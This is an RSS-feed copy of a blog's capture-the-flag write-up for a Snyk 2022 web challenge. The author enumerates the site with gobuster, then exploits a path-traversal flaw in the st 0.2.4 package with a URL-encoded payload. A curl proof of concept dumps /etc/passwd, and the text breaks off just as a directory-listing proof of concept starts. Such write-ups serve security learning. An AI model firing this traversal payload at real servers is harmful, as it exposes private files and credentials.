<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>LFI - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/lfi/</link><description>LFI - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 05 Dec 2022 00:09:37 +0100</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/lfi/" rel="self" type="application/rss+xml"/><item><title>Synk Fetch the Flag 2022 - Web - File Explorer</title><link>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-web-file-explorer/</link><pubDate>Mon, 05 Dec 2022 00:09:37 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-web-file-explorer/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/file_explorer.png" referrerpolicy="no-referrer">
            </div><h1 id="file-explorer">File Explorer</h1>
<h2 id="description">description</h2>
<p>tags:</p>
<ul>
<li>node.js</li>
<li>Snyk Open Source</li>
</ul>
<p>Expose hidden files in the web application.</p>
<p><a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a></p>
<p>hint: <a href="https://github.com/lcrowther-snyk/file-explorer" target="_blank" rel="noopener noreffer">https://github.com/lcrowther-snyk/file-explorer</a></p>
<h2 id="writeup">writeup</h2>
<p>After opening the website <a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a> in my webbrowser I see this:</p>
<p></p>
<p>the link with the caption “<strong>here”</strong> redirects me to <a href="http://file-explorer.c.ctf-snyk.io/public/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/public/</a> and we can see a directory listing:</p>
<p></p>
<p>This is the source code of the main site (<a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-title&#34;</span><span class="p">&gt;</span>Go ahead hack m3<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-title&#34;</span><span class="p">&gt;</span>find the flag<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Take a look at our files <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/public/&#34;</span><span class="p">&gt;</span>here<span class="p">&lt;</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After I could not find anything interesting on that directory I ran gobuster to scan for any hidden files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir gobuster
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gobuster dir --url <span class="o">[</span>http://file-explorer.c.ctf-snyk.io/<span class="o">](</span>http://file-explorer.c.ctf-snyk.io/<span class="o">)</span> --output gobuster/big.txt -w /usr/share/wordlists/dirb/big.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/blog9.txt            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/carrito.php          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/cd                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css-js.txt           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ebayimages.txt       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/edit_saved.php       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/editors.txt          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/edito.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/eds                  <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/elo.txt              <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gertrude             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gi.txt               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gizmo.txt            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glossario.txt        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glosuj               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glossario.php        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gprs.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/graduation           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34460</span> / <span class="m">81880</span> <span class="o">(</span>42.09%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:40:12 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/graphics2&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34536</span> / <span class="m">81880</span> <span class="o">(</span>42.18%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:40:30 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/greeting.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/gruppen.txt          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/guest-tracking.txt   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/guinness             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/h2                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34912</span> / <span class="m">81880</span> <span class="o">(</span>42.64%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:41:55 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/gz.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/happyholidays        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kill                 <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kindeditor.php       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kristi               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>g
</span></span><span class="line"><span class="cl">/lines.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/link_exchange.txt    <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/link_banner          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43600</span> / <span class="m">81880</span> <span class="o">(</span>53.25%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:52:46 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/links-page.txt&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/listing_photos       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/listmail.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43776</span> / <span class="m">81880</span> <span class="o">(</span>53.46%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:10 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/liuyan.zip&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43788</span> / <span class="m">81880</span> <span class="o">(</span>53.48%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:11 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/lit.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">44008</span> / <span class="m">81880</span> <span class="o">(</span>53.75%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:48 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/ln.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/louis.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/lucas.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/lulu.zip             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ma                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ma-fr.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/m2css.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/maint.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/makeover.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/manufacturers        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/marilyn.php          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/mark                 <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">46060</span> / <span class="m">81880</span> <span class="o">(</span>56.25%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:58:23 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/maxwell&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/mypoints.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/null.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>But unfortunately gobuster did not find anything.</p>
<p>In the hint of this challenge is a github repository mentioned:</p>
<p><a href="https://github.com/lcrowther-snyk/file-explorer/blob/main/app.js" target="_blank" rel="noopener noreffer">file-explorer/app.js at main · lcrowther-snyk/file-explorer</a></p>
<p>That looks to be the source code of this challenge!</p>
<p>The server is running node.js and here is the source code of the <code>app.js</code> file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Module dependencies.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">st</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;st&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// all environments
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3001</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">response</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">cwd</span><span class="p">()</span> <span class="o">+</span><span class="s1">&#39;/index.html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Static
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">st</span><span class="p">({</span> <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;./public&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/public&#39;</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">app</span><span class="p">).</span><span class="nx">listen</span><span class="p">(</span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">),</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Express server listening on port &#39;</span> <span class="o">+</span> <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can also take a look at the <code>package.json</code> file to get the version numbers of the packages:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="o">:</span> <span class="s2">&#34;goof&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;version&#34;</span><span class="o">:</span> <span class="s2">&#34;1.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;description&#34;</span><span class="o">:</span> <span class="s2">&#34;A vulnerable todo demo application&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;homepage&#34;</span><span class="o">:</span> <span class="s2">&#34;https://snyk.io/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;repository&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="o">:</span> <span class="s2">&#34;git&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;url&#34;</span><span class="o">:</span> <span class="s2">&#34;https://github.com/Snyk/snyk-todo-list-demo-app/&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;scripts&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;start&#34;</span><span class="o">:</span> <span class="s2">&#34;node app.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;build&#34;</span><span class="o">:</span> <span class="s2">&#34;browserify -r jquery &gt; public/js/bundle.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cleanup&#34;</span><span class="o">:</span> <span class="s2">&#34;mongo express-todo --eval &#39;db.todos.remove({});&#39;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;engines&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;node&#34;</span><span class="o">:</span> <span class="s2">&#34;6.14.1&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;dependencies&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;express&#34;</span><span class="o">:</span> <span class="s2">&#34;4.16.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;st&#34;</span><span class="o">:</span> <span class="s2">&#34;0.2.4&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I think it is weird that the program is using the <strong>st</strong> library.</p>
<p>The version used for <strong>st</strong> is <strong>0.2.4.</strong></p>
<p>After searching the internet , there seems to be a LFI vulnerability for this version of st.</p>
<p>Here is the link to snyk for the vulnerability:</p>
<p><a href="https://security.snyk.io/vuln/npm:st:20140206" target="_blank" rel="noopener noreffer">https://security.snyk.io/vuln/npm:st:20140206</a></p>
<p>Versions prior to 0.2.5 did not properly prevent path traversal. Literal dots in a path were resolved out, but url encoded dots were not. Thus, a request like <code>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code> would leak sensitive files and data from the server.</p>
<p>As of version 0.2.5, any <code>'/../'</code> in the request path, urlencoded or not, will be replaced with <code>'/'</code>. If your application depends on url traversal, then you are encouraged to please refactor so that you do not depend on having <code>..</code> in url paths, as this tends to expose data that you may be surprised to be exposing.</p>
<p>So it seems like we can get LFI working here by just encoding the <code>../</code> characters using URL-encoding. A single dot in URL encoding is: <code>%2e</code> . So two dots would be <code>%2e%2e</code> and the forward slash character is represented as <code>%2f</code> in URL-encoded form.</p>
<p>By replacing problematic characters like mentioned in the snyk vulnerability we could craft a payload that looks like this:</p>
<p><code>%2e%2e%2f%2e%2e%2f%2e%2e%2F%2e%2e%2F%2e%2e/etc/passwd</code></p>
<p>Here is a proof-of-concept for this LFI:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2F%2e%2e%2F%2e%2e/etc/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/bin/false
</span></span><span class="line"><span class="cl">node:x:1000:1000::/home/node:/bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can get the contents of /etc/passwd which means that the LFI works!</p>
<p>It can even be abused to get directory listing:</p>
<p>File Listing PoC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
